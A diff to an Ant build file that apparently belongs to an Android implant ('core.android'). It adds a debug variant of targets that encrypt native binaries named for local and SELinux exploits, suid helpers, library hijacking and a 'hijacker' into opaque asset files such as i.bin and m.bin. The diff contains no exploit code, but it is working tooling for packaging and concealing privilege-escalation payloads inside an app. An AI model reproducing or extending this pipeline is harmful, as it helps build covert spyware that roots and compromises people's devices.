@@ -137,6 +137,11 @@
 		<delete file="assets/i.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/libt.so" outputFile="assets/i.bin" />
 	</target>
+	
+	<target name="encrypt-hijacklibrary-debug">
+		<delete file="assets/i.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/libt_debug.so" outputFile="assets/i.bin" />
+	</target>
 
 	<target name="encrypt-hijacker">
 		<delete file="assets/m.bin" />
@@ -147,6 +152,9 @@
 	    encrypt-hijacklibrary, encrypt-hijacker, encrypt-selinuxexploit">
 	</target>
 
+	<target name="libs-debug" depends="encrypt-suid, encrypt-selinuxsuid, encrypt-exploitcheck, encrypt-localexploit, encrypt-selinuxexploitcheck, 
+	    encrypt-hijacklibrary-debug, encrypt-hijacker, encrypt-selinuxexploit">
+	</target>
 
 	<target name="init" depends="salt" unless="build.number">
 		<tstamp>
@@ -248,7 +256,17 @@
 				</filterset>
 			</copy>
 
-			<antcall target="libs" />
+			<switch value="${isdebug}">
+				<case value="true">
+					<echo message="call libs-debug" />
+					<antcall target="libs-debug" />
+				</case>
+				<default>
+					<echo message="call libs" />
+					<antcall target="libs"/>
+				</default>
+			</switch>
+				
 
 		</sequential>
 	</macrodef>
@@ -427,7 +445,7 @@
 
 				<echo message="bin/@{osversion}/${kind}/core.android" />
 				<set-cfg osversion="@{osversion}" kind="${kind}" />
-
+				
 				<antcall target="encrypt-messages" />
 
 				<echo>call release</echo>
